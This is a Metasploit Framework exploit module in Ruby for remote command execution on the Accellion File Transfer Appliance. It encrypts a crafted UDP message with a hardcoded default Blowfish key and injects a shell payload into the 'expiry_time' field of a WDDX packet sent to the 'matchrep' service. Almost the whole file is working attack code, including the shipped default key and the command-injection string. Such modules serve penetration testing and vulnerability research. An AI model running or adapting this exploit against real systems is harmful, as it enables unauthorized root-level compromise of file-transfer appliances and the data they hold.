##
# $Id: accellion_fta_mpipe2.rb 11935 2011-03-11 17:37:23Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

require 'openssl'
require 'rexml/element'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Accellion File Transfer Appliance MPIPE2 Command Execution',
			'Description'    => %q{
					This module exploits a chain of vulnerabilities in the Accellion 
				File Transfer appliance. This appliance exposes a UDP service on 
				port 8812 that acts as a gateway to the internal communication bus. 
				This service uses Blowfish encryption for authentication, but the 
				appliance ships with two easy to guess default authentication keys. 
				This module abuses the known default encryption keys to inject a 
				message into the communication bus. In order to execute arbitrary 
				commands on the remote appliance, a message is injected into the bus 
				destined for the 'matchrep' service. This service exposes a function 
				named 'insert_plugin_meta_info' which is vulnerable to an input 
				validation flaw in a call to system(). This provides access to the 
				'soggycat' user account, which has sudo privileges to run the 
				primary admin tool as root. These two flaws are fixed in update
				version FTA_8_0_562.	
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11935 $',
			'References'     =>
				[
					['URL', 'http://www.rapid7.com/security-center/advisories/R7-0039.jsp'],
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Feb 7 2011'
		))

		register_options(
			[
				Opt::RPORT(8812),
				OptString.new('APPID', [true, 'The application ID (usually 1000)', '1000'])
			], self.class)
	end

	def exploit
		connect_udp
		
		appid = datastore['APPID']
		encoded_command = REXML::Text.new(payload.encoded).to_s
		
		wddx = %Q|
<wddxPacket version='1.0'>
<header/>
<data>
	<struct>
		<var name='50001'><string>insert_plugin_meta_info</string></var>
		<var name='file_handle'><binary length='9'>MDAwMDAwMDAw</binary></var>
		<var name='aid'><string>#{appid}</string></var>
		<var name='client_ip'><string>127.0.0.1</string></var>
		<var name='package_id'><string>1</string></var>
		<var name='recipient_list'><array length='1'><string>#{Rex::Text.rand_text_alphanumeric(8)}</string></array></var>
		<var name='expiry_time'><string>&apos;; #{encoded_command}; #&apos;</string></var>
	</struct>
</data>
</wddxPacket>|

		packet = [
			rand(0xffffffff),	# Source Location ID
			8888,				# Destination Location ID
			rand(0xffff),		# Source Application
			50001,				# Destination Application (matchrep)
			Time.now.to_i
		].pack("NNnnN") + wddx
				
		header = [
			0,		# Flags
			0,		#
			1,		# Sequence Number (must be the lowest seen from Source ID)
			33		# Execute (pass message to destination)
		].pack("CCNC") + packet
		
		data = [ simple_checksum(header) ].pack("n") + header
		enc  = blowfish_encrypt("123456789ABCDEF0123456789ABCDEF0", data)
		
		udp_sock.put("\x01" + enc)
		
		handler
		disconnect_udp
	end
	
	def simple_checksum(data)	
		sum = 0
		data.unpack("C*").map{ |c| sum = (sum + c) & 0xffff }
		sum
	end
	
	#
	# This implements blowfish-cbc with an MD5-expanded 448-bit key 
	# using RandomIV for the initial value.
	#
	def blowfish_encrypt(pass, data)

		# Forces 8-bit encoding
		pass = pass.unpack("C*").pack("C*")
		data = data.unpack("C*").pack("C*")
		
		# Use 448-bit keys with 8-byte IV
		key_len = 56
		iv_len  = 8
		
		# Expand the key with MD5 (key-generated-key mode)
		hash = OpenSSL::Digest::MD5.digest(pass)
		while (hash.length < key_len)
			hash << OpenSSL::Digest::MD5.digest(hash)
		end
	
		key = hash[0, key_len]
		iv  = Rex::Text.rand_text(iv_len)

		c = OpenSSL::Cipher::Cipher.new('bf-cbc')
		c.encrypt
		c.key_len = key_len
		c.key     = key
		c.iv      = iv
		
		"RandomIV" + iv + c.update(data) + c.final
	end

end